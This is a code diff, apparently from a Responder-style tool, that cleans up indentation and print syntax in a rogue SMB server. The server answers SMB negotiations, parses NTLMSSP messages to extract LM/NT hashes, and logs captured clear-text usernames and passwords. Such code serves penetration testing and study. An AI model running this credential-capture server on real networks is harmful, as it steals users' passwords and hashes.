@@ -69,7 +69,7 @@ def ParseShare(data):
     packet = data[:]
     a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
     if a:
-        print text("[SMB] Requested Share     : %s" % a.group(0).decode('UTF-16LE'))
+        print(text("[SMB] Requested Share     : %s" % a.group(0).decode('UTF-16LE')))
 
 def GrabMessageID(data):
     Messageid = data[28:36]
@@ -92,8 +92,8 @@ def GrabSessionID(data):
     return SessionID
 
 def ParseSMBHash(data,client, Challenge):  #Parse SMB NTLMSSP v1/v2
-        SSPIStart  = data.find('NTLMSSP')
-        SSPIString = data[SSPIStart:]
+    SSPIStart  = data.find('NTLMSSP')
+    SSPIString = data[SSPIStart:]
     LMhashLen    = struct.unpack('<H',data[SSPIStart+14:SSPIStart+16])[0]
     LMhashOffset = struct.unpack('<H',data[SSPIStart+16:SSPIStart+18])[0]
     LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
@@ -187,7 +187,7 @@ def IsNT4ClearTxt(data, client):
             if PassLen > 2:
                 Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
                 User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
-                print text("[SMB] Clear Text Credentials: %s:%s" % (User,Password))
+                print(text("[SMB] Clear Text Credentials: %s:%s" % (User,Password)))
                 WriteData(settings.Config.SMBClearLog % client, User+":"+Password, User+":"+Password)
 
 
@@ -198,7 +198,7 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
             while True:
                 data = self.request.recv(1024)
                 self.request.settimeout(1)
-                                Challenge = RandomChallenge()
+                Challenge = RandomChallenge()
 
                 if not data:
                     break
@@ -211,46 +211,46 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
                     except:
                         pass
 
-                                ##Negotiate proto answer SMBv2.
+                ##Negotiate proto answer SMBv2.
                 if data[8:10] == "\x72\x00" and re.search("SMB 2.\?\?\?", data):
-                            head = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
-                            t = SMB2NegoAns()
-                        t.calculate()
-                        packet1 = str(head)+str(t)
-                            buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
-                            self.request.send(buffer1)
-                            data = self.request.recv(1024)
-                                ## Session Setup 1 answer SMBv2.
+                    head = SMB2Header(CreditCharge="\x00\x00",Credits="\x01\x00")
+                    t = SMB2NegoAns()
+                    t.calculate()
+                    packet1 = str(head)+str(t)
+                    buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
+                    self.request.send(buffer1)
+                    data = self.request.recv(1024)
+                ## Session Setup 1 answer SMBv2.
                 if data[16:18] == "\x00\x00" and data[4:5] == "\xfe":
-                            head = SMB2Header(MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data))
-                            t = SMB2NegoAns(Dialect="\x10\x02")
-                            t.calculate()
-                            packet1 = str(head)+str(t)
-                            buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
-                            self.request.send(buffer1)
-                            data = self.request.recv(1024)
-                                ## Session Setup 2 answer SMBv2.
+                    head = SMB2Header(MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data))
+                    t = SMB2NegoAns(Dialect="\x10\x02")
+                    t.calculate()
+                    packet1 = str(head)+str(t)
+                    buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
+                    self.request.send(buffer1)
+                    data = self.request.recv(1024)
+                ## Session Setup 2 answer SMBv2.
                 if data[16:18] == "\x01\x00" and data[4:5] == "\xfe":
-                            head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=GrabSessionID(data),NTStatus="\x16\x00\x00\xc0")
-                            t = SMB2Session1Data(NTLMSSPNtServerChallenge=Challenge)
-                            t.calculate()
-                            packet1 = str(head)+str(t)
-                            buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
-                            self.request.send(buffer1)
-                            data = self.request.recv(1024)
-                                ## Session Setup 3 answer SMBv2.
+                    head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=GrabSessionID(data),NTStatus="\x16\x00\x00\xc0")
+                    t = SMB2Session1Data(NTLMSSPNtServerChallenge=Challenge)
+                    t.calculate()
+                    packet1 = str(head)+str(t)
+                    buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
+                    self.request.send(buffer1)
+                    data = self.request.recv(1024)
+                ## Session Setup 3 answer SMBv2.
                 if data[16:18] == "\x01\x00" and GrabMessageID(data)[0:1] == "\x02" and data[4:5] == "\xfe":
-                            ParseSMBHash(data, self.client_address[0], Challenge)
-                            head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus="\x22\x00\x00\xc0", SessionID=GrabSessionID(data))
-                            t = SMB2Session2Data()
-                            packet1 = str(head)+str(t)
-                            buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
-                            self.request.send(buffer1)
-                            data = self.request.recv(1024)
+                    ParseSMBHash(data, self.client_address[0], Challenge)
+                    head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus="\x22\x00\x00\xc0", SessionID=GrabSessionID(data))
+                    t = SMB2Session2Data()
+                    packet1 = str(head)+str(t)
+                    buffer1 = struct.pack(">i", len(''.join(packet1)))+packet1  
+                    self.request.send(buffer1)
+                    data = self.request.recv(1024)
 
-                                # Negotiate Protocol Response smbv1
+                # Negotiate Protocol Response smbv1
                 if data[8:10] == "\x72\x00" and data[4:5] == "\xff" and re.search("SMB 2.\?\?\?", data) == None:
-                        Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
+                    Header = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
                     Body = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
                     Body.calculate()
         
@@ -314,7 +314,6 @@ class SMB1(BaseRequestHandler):  # SMB1 & SMB2 Server class, NTLMSSP
 
                             self.request.send(Buffer)
                             data = self.request.recv(1024)
-                
 
                 if data[8:10] == "\x75\x00" and data[4:5] == "\xff":  # Tree Connect AndX Request
                     ParseShare(data)
@@ -378,7 +377,7 @@ class SMB1LM(BaseRequestHandler):  # SMB Server class, old version
         try:
             self.request.settimeout(0.5)
             data = self.request.recv(1024)
-                        Challenge = RandomChallenge()
+            Challenge = RandomChallenge()
             if data[0] == "\x81":  #session request 139
                 Buffer = "\x82\x00\x00\x00"
                 self.request.send(Buffer)
